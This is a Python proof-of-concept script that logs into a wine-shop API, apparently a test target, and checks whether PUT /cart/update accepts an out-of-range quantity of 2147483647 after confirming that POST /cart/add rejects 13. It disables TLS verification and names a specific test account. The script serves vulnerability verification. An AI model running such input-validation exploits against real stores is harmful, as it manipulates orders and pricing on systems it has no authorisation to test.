     1	#!/usr/bin/env python3
     2	"""Verify: PUT /cart/update accepts arbitrary quantity (no min/max validation).
     3	
     4	Passes an out-of-range quantity (2147483647) via PUT /cart/update and
     5	checks whether the cart reflects that value. Exit 0 == VULNERABLE.
     6	
     7	Required environment variables:
     8	    LGRANGEIA_PASSWORD    Password for the test user
     9	
    10	Optional (override defaults):
    11	    TARGET_URL            API base URL (default: https://api.taintedport.com)
    12	    ATTACKER_USERNAME     Login email (default: luis.grangeia@snyk.io)
    13	
    14	Usage:
    15	    export LGRANGEIA_PASSWORD=...
    16	    python3 verify.py
    17	"""
    18	import os
    19	import sys
    20	
    21	import requests
    22	import urllib3
    23	
    24	urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    25	
    26	TARGET_URL = os.environ.get("TARGET_URL", "https://api.taintedport.com")
    27	ATTACKER_USERNAME = os.environ.get("ATTACKER_USERNAME", "luis.grangeia@snyk.io")
    28	ATTACKER_PASSWORD = os.environ.get("LGRANGEIA_PASSWORD")
    29	
    30	REQUIRED_VARS = ["LGRANGEIA_PASSWORD"]
    31	
    32	INT_MAX = 2147483647
    33	WINE_ID = 15  # Niepoort Redoma Branco (higher price for dramatic subtotal)
    34	
    35	
    36	def preflight():
    37	    missing = [v for v in REQUIRED_VARS if not os.environ.get(v)]
    38	    if missing:
    39	        print("ERROR: missing required environment variables:")
    40	        for v in missing:
    41	            print(f"  {v}")
    42	        print("\nSet them and re-run. See docstring for details.")
    43	        sys.exit(1)
    44	
    45	
    46	def check():
    47	    preflight()
    48	    # Login
    49	    r = requests.post(
    50	        f"{TARGET_URL}/auth/login",
    51	        json={"email": ATTACKER_USERNAME, "password": ATTACKER_PASSWORD},
    52	        verify=False, timeout=15,
    53	    )
    54	    r.raise_for_status()
    55	    token = r.json()["token"]
    56	    h = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
    57	
    58	    # Clear then seed
    59	    for wid in range(1, 30):
    60	        try:
    61	            requests.delete(f"{TARGET_URL}/cart/remove/{wid}", headers=h, verify=False, timeout=10)
    62	        except Exception:
    63	            pass
    64	    requests.post(f"{TARGET_URL}/cart/add", headers=h,
    65	                  json={"wine_id": WINE_ID, "quantity": 1}, verify=False, timeout=10)
    66	
    67	    # 1) Sanity: POST /cart/add correctly rejects out-of-range
    68	    add_reject = requests.post(f"{TARGET_URL}/cart/add", headers=h,
    69	                               json={"wine_id": WINE_ID, "quantity": 13},
    70	                               verify=False, timeout=10)
    71	    add_baseline_ok = (add_reject.status_code == 400)
    72	
    73	    # 2) PUT /cart/update with out-of-range quantity
    74	    upd = requests.put(f"{TARGET_URL}/cart/update", headers=h,
    75	                       json={"wine_id": WINE_ID, "quantity": INT_MAX},
    76	                       verify=False, timeout=10)
    77	    cart = requests.get(f"{TARGET_URL}/cart", headers=h, verify=False, timeout=10).json()
    78	    items = cart.get("items", [])
    79	    stored_qty = items[0]["quantity"] if items else 0
    80	    total = cart.get("total", 0)
    81	
    82	    # Cleanup
    83	    requests.delete(f"{TARGET_URL}/cart/remove/{WINE_ID}", headers=h, verify=False, timeout=10)
    84	
    85	    if not add_baseline_ok:
    86	        print(f"[ERROR] Baseline broken: POST /cart/add did not reject qty=13 (HTTP {add_reject.status_code})")
    87	        sys.exit(1)
    88	
    89	    if upd.status_code == 200 and stored_qty == INT_MAX and total > 1_000_000_000:
    90	        print(f"[VULNERABLE] PUT /cart/update accepted quantity={INT_MAX}; "
    91	              f"cart total={total} (POST /cart/add rejects qty=13 with HTTP 400)")
    92	        sys.exit(0)
    93	
    94	    print(f"[NOT VULNERABLE] PUT /cart/update rejected out-of-range qty "
    95	          f"(HTTP {upd.status_code}, stored_qty={stored_qty}, total={total})")
    96	    sys.exit(1)
    97	
    98	
    99	if __name__ == "__main__":
   100	    check()